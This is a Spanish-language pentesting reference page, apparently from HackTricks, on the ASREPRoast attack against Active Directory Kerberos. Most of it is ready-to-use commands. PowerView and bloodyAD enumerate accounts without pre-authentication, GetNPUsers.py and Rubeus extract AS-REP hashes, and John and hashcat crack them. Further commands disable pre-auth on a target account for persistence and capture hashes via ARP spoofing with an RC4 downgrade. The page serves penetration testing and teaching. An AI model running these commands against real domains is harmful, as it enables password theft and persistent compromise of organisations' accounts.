# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast es un ataque de seguridad que explota a los usuarios que carecen del **atributo requerido de pre-autenticación de Kerberos**. Esencialmente, esta vulnerabilidad permite a los atacantes solicitar autenticación para un usuario desde el Controlador de Dominio (DC) sin necesidad de la contraseña del usuario. El DC luego responde con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar descifrar sin conexión para descubrir la contraseña del usuario.

Los principales requisitos para este ataque son:

- **Falta de pre-autenticación de Kerberos**: Los usuarios objetivo no deben tener habilitada esta característica de seguridad.
- **Conexión al Controlador de Dominio (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
- **Cuenta de dominio opcional**: Tener una cuenta de dominio permite a los atacantes identificar de manera más eficiente a los usuarios vulnerables a través de consultas LDAP. Sin dicha cuenta, los atacantes deben adivinar los nombres de usuario.

#### Enumerando usuarios vulnerables (necesita credenciales de dominio)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensaje AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting con Rubeus generará un 4768 con un tipo de cifrado de 0x17 y un tipo de preautenticación de 0.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistencia

Forzar **preauth** no requerido para un usuario donde tienes permisos **GenericAll** (o permisos para escribir propiedades):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sin credenciales

Un atacante puede usar una posición de hombre en el medio para capturar paquetes AS-REP mientras atraviesan la red sin depender de que la pre-autenticación de Kerberos esté deshabilitada. Por lo tanto, funciona para todos los usuarios en la VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. Además, la herramienta obliga a las estaciones de trabajo de los clientes a usar RC4 al alterar la negociación de Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
